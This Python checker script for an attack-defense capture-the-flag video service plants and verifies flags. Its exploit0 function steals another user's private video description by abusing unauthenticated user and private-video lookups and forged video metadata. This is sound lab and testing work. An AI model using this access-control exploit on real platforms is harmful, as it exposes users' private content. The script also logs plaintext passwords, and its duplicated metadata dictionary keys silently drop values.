from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker
import os
from httpx import AsyncClient, Response
from names import adjectives, content_types, cities, countries
import ffmpeg
from bs4 import BeautifulSoup


from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 7777
checker = Enochecker("parcerotv", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

async def signup(client: AsyncClient, username: str, password:str, logger):
    logger.info(f"Starting signup process for user: {username}")
    signup_data = {"username": username,
                   "password": password}
    response = await client.post("/newuser", data=signup_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for signup process")
    if status_code in [200]:
        logger.info(f"user:{username} successfully registered")
    else:
        logger.error(f"Failed to sign up user, status_code: {status_code}")
        raise MumbleException(f"Failed to sign up user, status_code: {status_code}")

async def login(client: AsyncClient, username:str, password: str, logger):
    logger.info(f"Starting login process for user: {username} and password {password}")
    login_data = {"username": username,
                   "password": password}
    response = await client.post("/checkcredentials", data=login_data)
    logger.info(f"Response of /checkcredentials with status: {response.status_code} and with content {response.text}")
    status_code = response.status_code
    if status_code in [303]:
        logger.info(f"Successfull login of user {username} with redirection {status_code} ")
    else:
        logger.error(f"Failed Login of user {username} should be Unauthozired {status_code}")
        raise MumbleException(f"Failed Login of user {username} should be Unauthozired {status_code}")

def generate_title() -> str:
    adj = random.choice(adjectives)
    content = random.choice(content_types)
    number = random.randint(1, 10000)
    return f"{adj}-{content}-{number}"

def generate_location() -> str:
    country = random.choice(countries)
    city = random.choice(cities)
    return f"{country}, {city}"

def get_random_video_path(path="videos") -> str:
    video_extensions = {".mp4", ".mov", ".avi", ".mkv", ".webm", ".flv"}
    with os.scandir(path) as entries:
        videos = [entry.name for entry in entries
                  if entry.is_file() and os.path.splitext(entry.name)[1].lower() in video_extensions]
    if not videos:
        raise FileNotFoundError("No video files found in the directory.")
    return os.path.join(path, random.choice(videos))
    
def get_random_thumbnail_path(path="thumbnails") -> str:
    """Returns the full path to a random PNG thumbnail from the specified directory."""
    if not os.path.exists(path):
        raise FileNotFoundError(f"Directory '{path}' does not exist.")
    
    thumbnails = [
        f for f in os.listdir(path)
        if os.path.isfile(os.path.join(path, f)) and f.lower().endswith(".png")
    ]

    if not thumbnails:
        raise FileNotFoundError("No PNG thumbnails found in the directory.")

    return os.path.join(path, random.choice(thumbnails))
    

def create_video_with_metadata(creator: str, location, title,logger, is_exploit=False):
    """change metadata of video so it can be exploited later with ffmpeg"""
    if is_exploit:
        path = 'exploit.mp4'
    else:
        path = 'metadata_video.mp4'
    video_path = get_random_video_path()
    
    logger.info(f"Changing the metadata of the Video {title} with location {location} from creator {creator} saved at {path}, from the video \n {video_path}")
    
    ffmpeg.input(video_path).output(
    path,
    **{
        'metadata': f'title={title}',
        'metadata:': f'location={location}',
        'metadata': f'creator={creator}'
    }
    ).overwrite_output().run()
    logger.info("Metdata_video build successfully")
  
    

async def upload_private_video(client: AsyncClient, description, location, title, logger, is_exploit=False)-> str:
   """Upload a private video, description is the flag store"""
   logger.info(f"uploading a private video")
   if is_exploit:
       path = "exploit.mp4"
   else:
       path = "metadata_video.mp4"
   
   multiform_data = {
        "name": (None,title),
        "description": (None,description),
        "is_private": (None,"1"),
        
        "file": ("video", open(path,"rb"), "video/mp4"),
        "thumbnail": ("thumbnail", open(get_random_thumbnail_path(),"rb"), "image/png"),
        "location": (None,location)
        
    }
   logger.info("POST to create_video")
   response = await client.post("/app/create_video", files=multiform_data)
   status_code = response.status_code
   if status_code == 404:
        logger.info(f"Client error {status_code} with {response.text}")
   
   if status_code in [303]:
       logger.info(f"Video was succesfully uploaded")
       redirect_url = response.headers.get("Location")
       logger.info(f"Redirected to: {redirect_url}")
       return redirect_url 
   else:
       raise MumbleException(f"failed to upload video {title}, with location: {location}")

"""
CHECKER FUNCTIONS
"""

@checker.putflag(0)
async def putflag_note(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    username: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    logger.debug(f"Connecting to service")
    # Register a new user
    await signup(client,username, password,logger)
    # Login
    await login(client, username, password,logger)
    
    #Create Data for video
    title = generate_title()
    location = generate_location()
    description: str  = task.flag
    logger.debug(f"Creating video with right metadata for exploit")
    create_video_with_metadata(creator=username, location=location, title=title,logger=logger)
    logger.debug(f"Saving flag")
    url = await upload_private_video(client, description, location, title, logger)
    

    #save flag and userdata
    await db.set("userdata", (username, password, url, title))

    return username

@checker.getflag(0)
async def getflag_note(
    task: GetflagCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, client: AsyncClient
) -> None:
    try:
        username, password, url, title = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    logger.debug(f"getflag(0) for the user {username} and video {title}")
    await login(client, username, password,logger)

    logger.info(f"try to access flag in /app/myprofile")
    response = await client.get("/get_my_videos")
    logger.debug(response.text)
    assert_in(task.flag, response.text, "Flag missing")
        



@checker.exploit(0)
async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
    username_attacker: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password_attacker: str = "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    
    await signup(client, username_attacker, password_attacker, logger)
    await login(client, username_attacker, password_attacker, logger)
    
    
    logger.info(f"Exploiting {task.attack_info} ")
    username = task.attack_info
    response = await client.get(f"/get_user_info_with_name/{username}")
    if response.status_code != 200:
        raise MumbleException()
    json = response.json()
    logger.info(f"json is {json}")
    id = json.get("id")
    logger.info(f"/get_private_videos/{id}")
    private_video_response = await client.get(f"/get_private_videos/{id}")
    videos = private_video_response.json()
    video = videos[0]
    title = video.get("name")
    location = video.get("location")
    
    create_video_with_metadata(username, location, title,logger, is_exploit=True)
    await upload_private_video(client, "ist egal", "Berlin", title,logger, True)
    
    my_vid_response = await client.get("/get_my_videos")
    if my_vid_response.status_code != 200:
        raise MumbleException()
    videos = my_vid_response.json()
    logger.info(f"Videos are {videos}")
    for video in videos:
        logger.info(f"video {video}")
        if video.get("name") == title:
            video_path = video.get("path")
            break
    
    logger.info(f"/get_video_info/{video_path}")
    video_response = await client.get(f"/get_video_info/{video_path}")
    if video_response.status_code != 200:
        raise MumbleException()
    video_exploited = video_response.json()
    
    if flag := searcher.search_flag(video_exploited.get("description")):
        return flag
    raise MumbleException("flag not found")



if __name__ == "__main__":
    checker.run()